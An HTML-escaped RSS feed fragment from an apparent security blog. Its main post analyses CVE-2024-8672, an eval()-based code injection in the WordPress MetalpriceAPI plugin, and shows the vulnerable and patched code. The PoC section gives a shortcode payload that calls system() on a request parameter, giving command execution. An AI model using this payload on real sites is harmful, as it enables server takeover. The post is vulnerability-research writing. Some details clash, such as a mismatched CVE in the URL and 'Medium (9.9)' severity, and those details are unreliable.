Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never trust data from &lt;code&gt;$_GET&lt;/code&gt;, &lt;code&gt;$_POST&lt;/code&gt;, &lt;code&gt;$_REQUEST&lt;/code&gt; – always &lt;strong&gt;sanitize and escape&lt;/strong&gt; before using or displaying it.&lt;/li&gt;&#xA;&lt;li&gt;A vulnerability in a shared SDK (such as Freemius) creates a &lt;strong&gt;chain reaction&lt;/strong&gt; affecting thousands of products.&lt;/li&gt;&#xA;&lt;li&gt;Always check third-party libraries and &lt;strong&gt;update to patched versions in a timely manner&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Early SDK initialization increases the chance that a vulnerability can be triggered on more requests than expected.&lt;/li&gt;&#xA;&lt;li&gt;Reflected XSS can be exploited indirectly through &lt;strong&gt;social engineering&lt;/strong&gt; and malicious websites.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross Site Scripting&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Freemius/wordpress-sdk/commit/e34e4f1eb67d02ec20ee8c7ab65c1ca1efe40c01&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/Freemius/wordpress-sdk/commit/e34e4f1eb67d02ec20ee8c7ab65c1ca1efe40c01&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-8672 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-05-cve-2025-48140/</link>
      <pubDate>Fri, 05 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-05-cve-2025-48140/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-05-cve-2025-48140/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The Improper Control of Generation of Code (&amp;ldquo;Code Injection&amp;rdquo;) vulnerability in MetalpriceAPI allows Code Injection to be performed. This issue affects MetalpriceAPI from n/a up to version &lt;strong&gt;1.1.4&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-8672&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-8672&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.1.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/metalpriceapi/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MetalpriceAPI Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version – MetalpriceAPI&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.1.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.1.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v1.1.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($attrs[&amp;#39;operation&amp;#39;])) {&#xA;    $operation = $attrs[&amp;#39;operation&amp;#39;];&#xA;    $operation = str_replace(&amp;#39;(value)&amp;#39;, $price, $operation);&#xA;    eval(&amp;#39;$price = &amp;#39; . $operation . &amp;#39;;&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The value of &lt;code&gt;$attrs[&#39;operation&#39;]&lt;/code&gt; from the shortcode is directly concatenated into a PHP string and then passed to &lt;code&gt;eval()&lt;/code&gt;. An attacker can inject arbitrary PHP code ⇒ RCE.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version (v1.1.5):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($attrs[&amp;#39;operation&amp;#39;])) {&#xA;    $price = $this-&amp;gt;safe_math_eval($attrs[&amp;#39;operation&amp;#39;], $price);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Instead of using &lt;code&gt;eval()&lt;/code&gt;, a custom &lt;code&gt;safe_math_eval&lt;/code&gt; function is used, completely eliminating the ability to execute system code.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function safe_math_eval($expression, $value) {&#xA;    // Remove any whitespace&#xA;    $expression = preg_replace(&amp;#39;/\s&amp;#43;/&amp;#39;, &amp;#39;&amp;#39;, $expression);&#xA;&#xA;    // Only allow basic math operations, numbers, and the value keyword&#xA;    if (!preg_match(&amp;#39;/^[0-9\.\&amp;#43;\-\*\/\(\)value]&amp;#43;$/&amp;#39;, $expression)) {&#xA;        return $value;&#xA;    }&#xA;&#xA;    // Replace (value) with the actual value&#xA;    $expression = str_replace(&amp;#39;(value)&amp;#39;, $value, $expression);&#xA;&#xA;    // Use a safe evaluation method&#xA;    try {&#xA;        // Split the expression into tokens&#xA;        $tokens = preg_split(&amp;#39;/([\&amp;#43;\-\*\/\(\)])/&amp;#39;, $expression, -1, PREG_SPLIT_DELIM_CAPTURE | PREG_SPLIT_NO_EMPTY);&#xA;&#xA;        // Convert to Reverse Polish Notation (RPN)&#xA;        $output = array();&#xA;        $operators = array();&#xA;&#xA;        foreach ($tokens as $token) {&#xA;        if (is_numeric($token)) {&#xA;            $output[] = $token;&#xA;        } elseif ($token === &amp;#39;(&amp;#39;) {&#xA;            $operators[] = $token;&#xA;        } elseif ($token === &amp;#39;)&amp;#39;) {&#xA;            while (count($operators) &amp;gt; 0 &amp;amp;&amp;amp; end($operators) !== &amp;#39;(&amp;#39;) {&#xA;            $output[] = array_pop($operators);&#xA;            }&#xA;            if (count($operators) &amp;gt; 0 &amp;amp;&amp;amp; end($operators) === &amp;#39;(&amp;#39;) {&#xA;            array_pop($operators);&#xA;            }&#xA;        } else {&#xA;            $precedence = array(&#xA;            &amp;#39;&amp;#43;&amp;#39; =&amp;gt; 1,&#xA;            &amp;#39;-&amp;#39; =&amp;gt; 1,&#xA;            &amp;#39;*&amp;#39; =&amp;gt; 2,&#xA;            &amp;#39;/&amp;#39; =&amp;gt; 2&#xA;            );&#xA;&#xA;            while (count($operators) &amp;gt; 0 &amp;amp;&amp;amp;&#xA;                    end($operators) !== &amp;#39;(&amp;#39; &amp;amp;&amp;amp;&#xA;                    $precedence[$token] &amp;lt;= $precedence[end($operators)]) {&#xA;            $output[] = array_pop($operators);&#xA;            }&#xA;            $operators[] = $token;&#xA;        }&#xA;        }&#xA;&#xA;        while (count($operators) &amp;gt; 0) {&#xA;        $output[] = array_pop($operators);&#xA;        }&#xA;&#xA;        // Evaluate RPN&#xA;        $stack = array();&#xA;        foreach ($output as $token) {&#xA;        if (is_numeric($token)) {&#xA;            array_push($stack, $token);&#xA;        } else {&#xA;            $b = array_pop($stack);&#xA;            $a = array_pop($stack);&#xA;&#xA;            switch ($token) {&#xA;            case &amp;#39;&amp;#43;&amp;#39;:&#xA;                array_push($stack, $a &amp;#43; $b);&#xA;                break;&#xA;            case &amp;#39;-&amp;#39;:&#xA;                array_push($stack, $a - $b);&#xA;                break;&#xA;            case &amp;#39;*&amp;#39;:&#xA;                array_push($stack, $a * $b);&#xA;                break;&#xA;            case &amp;#39;/&amp;#39;:&#xA;                if ($b == 0) {&#xA;                return $value; // Division by zero&#xA;                }&#xA;                array_push($stack, $a / $b);&#xA;                break;&#xA;            }&#xA;        }&#xA;        }&#xA;&#xA;        $result = array_pop($stack);&#xA;        return is_numeric($result) ? $result : $value;&#xA;    } catch (Exception $e) {&#xA;        return $value;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers the &lt;code&gt;metalpriceapi&lt;/code&gt; shortcode with the &lt;code&gt;shortcode()&lt;/code&gt; callback:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_shortcode(&amp;#39;metalpriceapi&amp;#39;, [$this, &amp;#39;shortcode&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Inside the &lt;code&gt;shortcode()&lt;/code&gt; function, input parameters are retrieved from the shortcode using &lt;code&gt;shortcode_atts()&lt;/code&gt;. The plugin then retrieves the saved &lt;code&gt;api_key&lt;/code&gt; using &lt;code&gt;get_option()&lt;/code&gt;, constructs the URL, and sends a request to &lt;code&gt;https://api.metalpriceapi.com&lt;/code&gt; using &lt;code&gt;wp_remote_get()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;If an account is registered at &lt;code&gt;metalpriceapi.com&lt;/code&gt; and the API key is entered in the plugin Settings:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2025-48140/api.png&#34; title=&#34;Enter API key&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2025-48140/api.png&#34; data-sub-html=&#34;&lt;h2&gt;API&lt;/h2&gt;&lt;p&gt;Enter API key&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2025-48140/api.png&#39; alt=&#34;API&#34; height=&#34;288&#34; width=&#34;925&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Enter API key&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The response will look like:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&amp;#34;success&amp;#34;:true,&amp;#34;base&amp;#34;:&amp;#34;USD&amp;#34;,&amp;#34;timestamp&amp;#34;:1764633599,&amp;#34;rates&amp;#34;:{&amp;#34;USDXAU&amp;#34;:4230.2580203577,&amp;#34;XAU&amp;#34;:0.0002363922}}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The response body is decoded into an array using &lt;code&gt;json_decode()&lt;/code&gt;. When the condition&#xA;&lt;code&gt;isset($json[&#39;success&#39;]) &amp;amp;&amp;amp; $json[&#39;success&#39;] == true&lt;/code&gt; is satisfied and the shortcode provides the &lt;code&gt;operation&lt;/code&gt; parameter, the plugin executes:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$operation = $attrs[&amp;#39;operation&amp;#39;];&#xA;$operation = str_replace(&amp;#39;(value)&amp;#39;, $price, $operation);&#xA;eval(&amp;#39;$price = &amp;#39; . $operation . &amp;#39;;&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here, the user-controlled &lt;code&gt;operation&lt;/code&gt; value is passed directly into &lt;code&gt;eval()&lt;/code&gt;, leading to arbitrary PHP code execution. This allows an attacker to inject and execute commands on the server via the &lt;code&gt;operation&lt;/code&gt; parameter in the shortcode.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Attacker with Contributor (or higher) role&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Creates or edits a post/content&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;Inserts [metalpriceapi operation=payload]&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;WordPress renders the shortcode&amp;#34;]&#xA;--&amp;gt; E[&amp;#34;Plugin executes shortcode() function&amp;#34;]&#xA;--&amp;gt; F[&amp;#34;operation is concatenated into a PHP expression&amp;#34;]&#xA;--&amp;gt; G[&amp;#34;eval() executes the attacker‑controlled input&amp;#34;]&#xA;--&amp;gt; H[&amp;#34;Remote Code Execution (RCE) on the server&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a post using a Contributor account&lt;/li&gt;&#xA;&lt;li&gt;Add the shortcode:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;[metalpriceapi operation=&amp;#39;&amp;#34;abc&amp;#34;;system($_REQUEST(&amp;#34;cmd&amp;#34;));die()&amp;#39;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2025-48140/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2025-48140/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2025-48140/result.png&#39; alt=&#34;Result&#34; height=&#34;409&#34; width=&#34;1221&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2024-8672 in the WordPress MetalpriceAPI plugin (&amp;lt;= 1.1.4) is a critical RCE vulnerability caused by directly using &lt;code&gt;eval()&lt;/code&gt; with user-controlled input from the &lt;code&gt;operation&lt;/code&gt; parameter in the shortcode. With only Contributor privileges, an attacker can inject and execute arbitrary PHP code on the server, leading to system compromise, data leakage, or malware installation. Version 1.1.5 fixed the issue by removing &lt;code&gt;eval()&lt;/code&gt; and replacing it with a safer expression-handling function.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never use &lt;code&gt;eval()&lt;/code&gt; with user-supplied input, even indirectly.&lt;/li&gt;&#xA;&lt;li&gt;WordPress shortcodes, 